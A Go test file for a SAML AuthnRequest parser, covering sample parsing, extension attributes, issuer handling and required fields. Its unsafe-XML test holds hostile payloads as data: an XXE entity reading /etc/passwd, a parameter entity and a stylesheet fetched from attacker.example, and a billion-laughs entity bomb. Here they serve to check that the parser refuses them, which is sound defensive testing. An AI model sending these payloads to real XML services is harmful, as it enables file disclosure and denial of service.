package saml

import (
	"fmt"
	"os"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func authnRequest(attributes, body string) string {
	return `<samlp:AuthnRequest xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"` +
		` xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata"` +
		` xmlns:req-attr="urn:oasis:names:tc:SAML:protocol:ext:req-attr"` +
		` xmlns:xs="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"` +
		` ID="_id" Version="2.0" IssueInstant="2026-03-01T12:00:00Z" ` + attributes + `>` +
		`<saml:Issuer>https://sp.example/metadata</saml:Issuer>` + body + `</samlp:AuthnRequest>`
}

// samples/proposal-request.xml is the request the broker and the bridge
// agreed on in 2020.
func TestParseAuthnRequestSample(t *testing.T) {
	data, err := os.ReadFile("../../samples/proposal-request.xml")
	require.NoError(t, err)

	req, err := ParseAuthnRequest(data)
	require.NoError(t, err)

	assert.Equal(t, "_6870370f-d624-3251-b2d8-dd8e4a131342", req.ID)
	assert.Equal(t, time.Date(2020, 3, 12, 15, 42, 43, 0, time.UTC), req.IssueInstant.UTC())
	assert.Equal(t, "sidn1.cib.pre.connectis.com-broker-irma", req.Issuer)
	assert.Equal(t, "https://sidn1.cib.pre.connectis.com/broker/acs", req.ACSURL)
	assert.Equal(t, "https://irmabrug.a2.ota.sidn.nl/irma-saml-bridge/request", req.Destination)
	require.NotNil(t, req.ProviderName)
	assert.Equal(t, "Connectis", *req.ProviderName)
	assert.Nil(t, req.NameIDPolicyFormat)

	assert.Equal(t, []ExtensionAttribute{
		{Name: "irma-demo.sidn-pbdf.email.email", Requested: true},
		{Name: "irma-demo.sidn-pbdf.email.domain", Requested: true},
	}, req.Attributes)
}

func TestParseAuthnRequestExtensions(t *testing.T) {
	const condiscon = `[[["a.b.c.d"]]]`

	req, err := ParseAuthnRequest([]byte(authnRequest(``,
		`<samlp:Extensions>`+
			`<req-attr:RequestedAttributes>`+
			`<md:RequestedAttribute Name="condiscon"><saml:AttributeValue xsi:type="xs:string"> `+condiscon+` </saml:AttributeValue></md:RequestedAttribute>`+
			`<saml:Attribute Name="ignored-here"/>`+
			`</req-attr:RequestedAttributes>`+
			`<saml:Attribute Name="plain"><saml:AttributeValue>untyped</saml:AttributeValue></saml:Attribute>`+
			`<md:RequestedAttribute Name="direct"/>`+
			`<other xmlns="urn:other"/>`+
			`</samlp:Extensions>`+
			`<samlp:NameIDPolicy Format="urn:format"/>`)))
	require.NoError(t, err)

	assert.Equal(t, []ExtensionAttribute{
		{Name: "condiscon", Requested: true, Values: []ExtensionValue{{String: true, Text: condiscon}}},
		{Name: "plain", Values: []ExtensionValue{{Text: "untyped"}}},
		{Name: "direct", Requested: true},
	}, req.Attributes)

	require.NotNil(t, req.NameIDPolicyFormat)
	assert.Equal(t, "urn:format", *req.NameIDPolicyFormat)
	assert.Nil(t, req.ProviderName)
	assert.Empty(t, req.ACSURL)
}

// xsi:type is a QName: what counts is the namespace its prefix is bound to.
func TestStringTypedValues(t *testing.T) {
	tests := map[string]struct {
		value string
		want  bool
	}{
		"xs prefix":         {`<saml:AttributeValue xsi:type="xs:string">v</saml:AttributeValue>`, true},
		"own prefix":        {`<saml:AttributeValue xmlns:q="http://www.w3.org/2001/XMLSchema" xsi:type="q:string">v</saml:AttributeValue>`, true},
		"default namespace": {`<AttributeValue xmlns="http://www.w3.org/2001/XMLSchema" xsi:type="string">v</AttributeValue>`, true},
		"untyped":           {`<saml:AttributeValue>v</saml:AttributeValue>`, false},
		"other type":        {`<saml:AttributeValue xsi:type="xs:anyURI">v</saml:AttributeValue>`, false},
		"other namespace":   {`<saml:AttributeValue xmlns:q="urn:other" xsi:type="q:string">v</saml:AttributeValue>`, false},
		"unbound prefix":    {`<saml:AttributeValue xsi:type="nope:string">v</saml:AttributeValue>`, false},
		"type without xsi":  {`<saml:AttributeValue type="xs:string">v</saml:AttributeValue>`, false},
	}

	for name, tt := range tests {
		t.Run(name, func(t *testing.T) {
			req, err := ParseAuthnRequest([]byte(authnRequest(``,
				`<samlp:Extensions><saml:Attribute Name="condiscon">`+tt.value+`</saml:Attribute></samlp:Extensions>`)))
			require.NoError(t, err)
			require.Len(t, req.Attributes, 1)
			require.Len(t, req.Attributes[0].Values, 1)
			assert.Equal(t, tt.want, req.Attributes[0].Values[0].String)
		})
	}
}

func TestParseAuthnRequestIssuer(t *testing.T) {
	tests := map[string]struct {
		issuer string
		want   string
	}{
		"plain":         {`<saml:Issuer>sp</saml:Issuer>`, "sp"},
		"white space":   {"<saml:Issuer>\n  sp\n</saml:Issuer>", "sp"},
		"entity format": {`<saml:Issuer Format="urn:oasis:names:tc:SAML:2.0:nameid-format:entity">sp</saml:Issuer>`, "sp"},
		"other format":  {`<saml:Issuer Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">sp</saml:Issuer>`, ""},
		"no issuer":     {``, ""},
		"wrong element": {`<samlp:Issuer>sp</samlp:Issuer>`, ""},
	}

	for name, tt := range tests {
		t.Run(name, func(t *testing.T) {
			xml := strings.Replace(authnRequest(``, ``), `<saml:Issuer>https://sp.example/metadata</saml:Issuer>`, tt.issuer, 1)

			req, err := ParseAuthnRequest([]byte(xml))
			require.NoError(t, err)
			assert.Equal(t, tt.want, req.Issuer)
		})
	}
}

func TestParseAuthnRequestRejectsOtherMessages(t *testing.T) {
	// A Response of the Java service, as kept in samples/.
	response, err := os.ReadFile("../../samples/current-response.xml")
	require.NoError(t, err)

	tests := map[string]string{
		"response":        string(response),
		"logout request":  `<samlp:LogoutRequest xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="_1" Version="2.0" IssueInstant="2026-01-01T00:00:00Z"/>`,
		"no namespace":    `<AuthnRequest ID="_1" Version="2.0" IssueInstant="2026-01-01T00:00:00Z"/>`,
		"SAML 1 protocol": `<samlp:AuthnRequest xmlns:samlp="urn:oasis:names:tc:SAML:1.0:protocol" ID="_1" Version="2.0" IssueInstant="2026-01-01T00:00:00Z"/>`,
	}

	for name, xml := range tests {
		t.Run(name, func(t *testing.T) {
			_, err := ParseAuthnRequest([]byte(xml))
			require.ErrorIs(t, err, ErrNotAuthnRequest)
		})
	}
}

func TestParseAuthnRequestRequiresIDVersionAndIssueInstant(t *testing.T) {
	valid := authnRequest(``, ``)

	_, err := ParseAuthnRequest([]byte(valid))
	require.NoError(t, err)

	tests := map[string]string{
		"no ID":                  strings.Replace(valid, ` ID="_id"`, ``, 1),
		"empty ID":               strings.Replace(valid, ` ID="_id"`, ` ID=""`, 1),
		"no version":             strings.Replace(valid, ` Version="2.0"`, ``, 1),
		"version 1.1":            strings.Replace(valid, ` Version="2.0"`, ` Version="1.1"`, 1),
		"no issue instant":       strings.Replace(valid, ` IssueInstant="2026-03-01T12:00:00Z"`, ``, 1),
		"instant without a zone": strings.Replace(valid, `2026-03-01T12:00:00Z`, `2026-03-01T12:00:00`, 1),
		"instant not a time":     strings.Replace(valid, `2026-03-01T12:00:00Z`, `yesterday`, 1),
	}

	for name, xml := range tests {
		t.Run(name, func(t *testing.T) {
			require.NotEqual(t, valid, xml)

			_, err := ParseAuthnRequest([]byte(xml))
			require.ErrorIs(t, err, ErrXML)
		})
	}
}

func TestParseAuthnRequestTimeFormats(t *testing.T) {
	want := time.Date(2026, 3, 1, 12, 0, 0, 0, time.UTC)

	for _, instant := range []string{"2026-03-01T12:00:00Z", "2026-03-01T12:00:00.000Z", "2026-03-01T13:00:00+01:00", "2026-03-01T12:00:00.000000Z"} {
		req, err := ParseAuthnRequest([]byte(strings.Replace(authnRequest(``, ``), "2026-03-01T12:00:00Z", instant, 1)))
		require.NoError(t, err, instant)
		assert.True(t, want.Equal(req.IssueInstant), instant)
	}
}

// XML with a DTD, with entities, or that is too large or too deep is
// refused before anything is built from it.
func TestParseAuthnRequestRejectsUnsafeXML(t *testing.T) {
	valid := authnRequest(``, ``)

	deep := strings.Repeat("<a>", maxXMLDepth+1) + strings.Repeat("</a>", maxXMLDepth+1)

	tests := map[string]string{
		"doctype": `<!DOCTYPE samlp:AuthnRequest>` + valid,
		"internal entity": `<!DOCTYPE r [<!ENTITY e "expanded">]>` +
			strings.Replace(valid, `https://sp.example/metadata`, `&e;`, 1),
		"external entity": `<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` +
			strings.Replace(valid, `https://sp.example/metadata`, `&xxe;`, 1),
		"parameter entity": `<!DOCTYPE r [<!ENTITY % p SYSTEM "http://attacker.example/x.dtd"> %p;]>` + valid,
		"billion laughs": `<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">` +
			`<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]>` +
			strings.Replace(valid, `https://sp.example/metadata`, `&lol3;`, 1),
		"undeclared entity":      strings.Replace(valid, `https://sp.example/metadata`, `&nbsp;`, 1),
		"processing instruction": strings.Replace(valid, `<saml:Issuer>`, `<?php echo 1 ?><saml:Issuer>`, 1),
		"stylesheet instruction": `<?xml-stylesheet href="http://attacker.example/x.xsl"?>` + valid,
		"too large":              strings.Replace(valid, `</samlp:AuthnRequest>`, strings.Repeat(" ", MaxRequestXMLBytes)+`</samlp:AuthnRequest>`, 1),
		"too deep":               strings.Replace(valid, `</samlp:AuthnRequest>`, deep+`</samlp:AuthnRequest>`, 1),
		"not well formed":        strings.Replace(valid, `</saml:Issuer>`, ``, 1),
		"two roots":              valid + valid,
		"empty":                  ``,
		"not XML":                `{"saml": false}`,
		"other encoding":         `<?xml version="1.0" encoding="UTF-16"?>` + valid,
	}

	for name, xml := range tests {
		t.Run(name, func(t *testing.T) {
			_, err := ParseAuthnRequest([]byte(xml))
			require.ErrorIs(t, err, ErrXML)
		})
	}
}

// The predefined entities and character references are ordinary XML and
// must keep working: a relay of an entity ID with an ampersand, for one.
func TestParseAuthnRequestAcceptsPredefinedEntities(t *testing.T) {
	xml := `<?xml version="1.0" encoding="UTF-8"?>` + "\n<!-- a comment -->\n" +
		strings.Replace(authnRequest(``, ``), `https://sp.example/metadata`, `https://sp.example/?a=1&amp;b=&#50;&lt;`, 1)

	req, err := ParseAuthnRequest([]byte(xml))
	require.NoError(t, err)
	assert.Equal(t, "https://sp.example/?a=1&b=2<", req.Issuer)
}

func TestParseAuthnRequestAtTheDepthLimit(t *testing.T) {
	// The AuthnRequest element is one level, so this nests to the limit.
	nested := strings.Repeat("<a>", maxXMLDepth-1) + strings.Repeat("</a>", maxXMLDepth-1)

	_, err := ParseAuthnRequest([]byte(strings.Replace(authnRequest(``, ``), `</samlp:AuthnRequest>`, nested+`</samlp:AuthnRequest>`, 1)))
	require.NoError(t, err, fmt.Sprintf("depth %d is allowed", maxXMLDepth))
}
